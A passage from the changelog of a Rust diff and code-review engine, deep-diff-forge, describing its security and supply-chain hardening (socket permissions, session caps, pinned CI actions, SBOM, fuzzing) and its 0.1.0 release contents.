  without `$XDG_RUNTIME_DIR`).
- **Fail-closed trust** — agent annotation `source` is no longer inferred from an
  attacker-controlled label; learning-store files are owner-private (`0700`/`0600`).
- **Supply chain** — `unsafe_code = "forbid"` is now compiler-enforced
  workspace-wide; `tree-sitter` is pinned to exact versions; a strict `cargo
  audit` gate runs in CI and gates the irreversible crates.io publish;
  least-privilege workflow permissions; Dependabot; `SECURITY.md`.

A second bias-controlled re-review (S1008443) raised three further findings, each
fixed and independently verified (security / tester / claim-verifier judges,
outside the build loop):

- **Mandatory hunk-header closer** — `parse_hunk_header` now requires the closing
  `@@` token; a header with trailing garbage and no closer (`@@ -1,1 +1,1
  NOT_A_HUNK`) is rejected (exit 4) instead of normalizing into a valid model.
  Completes the patch-truth hardening alongside the truncated-hunk fix.
- **Explicit `--socket` no longer mutates caller state** — `SocketLocation` carries
  provenance; an explicit `--socket` path binds via a fail-closed `bind_explicit`
  that **creates** an absent parent at `0700` but **never chmods a pre-existing
  parent** (a world-readable parent fails closed rather than being silently
  tightened to `0700`) and removes the socket path **only if it is verifiably a
  socket** (never a regular file, directory, or symlink). The engine-owned
  `$XDG_RUNTIME_DIR` path is unchanged, and `daemon start --socket /new/path` still
  works (the absent parent is created).
- **Bounded daemon sessions** — review sessions are capped at `MAX_SESSIONS` (64)
  with LRU eviction (least-recently-used evicted before insert; reads refresh
  recency), hard-bounding daemon memory regardless of how many sessions a client
  opens without closing.

A supply-chain & fuzz hardening pass then raised the release/CI posture:

- **GitHub Actions pinned to commit SHAs** across CI and release (tag-hijack
  defence); the release workflow now emits **SLSA build-provenance attestations**
  for the binary, its checksum, and the SBOM.
- **SPDX SBOM** (`sbom.spdx.json`) generated from `Cargo.lock`/`cargo metadata`,
  gated in CI and uploaded with each release.
- **Fuzz harness** (`fuzz/`, cargo-fuzz) — four targets (`patch_parser`,
  `review_json`, `daemon_protocol`, `agent_annotation`), excluded from the
  publishable workspace; a compile gate keeps it building in CI.
- **CI security probes** — a hostile-daemon soak, a learning-privacy probe, and a
  mutation-gate inventory, exposed as `just security-*` recipes.
- Added a JSON-RPC wire error-code regression test and empty-input
  `--json`/`--jsonl` stability tests. Corrected the daemon's `lib.rs` doc from
  "thread-per-connection" to the true single-threaded sequential accept loop.

[Unreleased]: https://github.com/Louranicas/deep-diff-forge/compare/v0.8.3...HEAD
[0.8.3]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.8.3
[0.8.2]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.8.2
[0.8.1]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.8.1
[0.8.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.8.0
[0.7.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.7.0
[0.6.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.6.0
[0.5.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.5.0
[0.4.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.4.0
[0.3.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.3.0
[0.2.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.2.0

## [0.1.0] - 2026-06-22

First tagged release. The complete diff/review engine (layers L1–L7,
Patch→Daemon) at deployment maturity **L8 (Release)** — 11 crates, 568 tests,
zero `unsafe`, supply-chain-gated.

### Added

- **Patch (L1)** — `deep-diff-forge-patch`: unified/Git patch parser, apply-able
  renderer, and `deep-diff-forge.review.v0` JSON. CLI `--stdin-patch [--json]`.
- **Projection (L2)** — `deep-diff-forge-projection`: renderer-neutral inline and
  side-by-side views. CLI `--layout inline|side-by-side`.
- **Pipeline (L3)** — `deep-diff-forge-pipeline`: composable Unix-filter stages
  (`ChainStage`) and JSONL streaming. CLI `--jsonl`.
- **Semantic (L4)** — `deep-diff-forge-syntax`: tree-sitter language detection,
  budgeted parsing, and symbol extraction (Rust). CLI `semantic <path> [--json]`.
- **Review (L5)** — `deep-diff-forge-graph` (Review Intelligence Graph,
  deterministic risk ranking; CLI `--rank`), `deep-diff-forge-agent` (annotation
  provenance, grounding, sanitization), and `deep-diff-forge-tui` (review TUI;
  CLI `review [--probe]`).
- **Cluster (L6)** — `deep-diff-forge-cluster`: bounded parallel dimensional
  execution with deterministic joins and receipts. CLI `--cluster [--parallel]`.
- **Daemon (L7)** — `deep-diff-forge-daemon`: optional UDS JSON-RPC service
  (std-first, owner-private sockets). CLI `daemon {path|start|health|status|stop}`.
- **Deployment surface** — `deploy status` and `deploy release` machine-readable
  reports (`deployment-status.v0`, `release.v0`); CI workflow; `deny.toml`
  supply-chain policy; release workflow (`release.yml`).

### Engineering

- Strictly acyclic 11-crate workspace; `core` is pure vocabulary.
- Patch truth is preserved across every layer (never mutated by enrichment).
- Each production crate carries at least 50 meaningful tests.
- Pedantic clippy clean; no production `unwrap`/`expect`; no `unsafe`.

### Not yet released

- **crates.io publication** is pending a registry token (the release workflow
  publishes automatically when `CARGO_REGISTRY_TOKEN` is configured).

[0.2.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.2.0
[0.1.0]: https://github.com/Louranicas/deep-diff-forge/releases/tag/v0.1.0
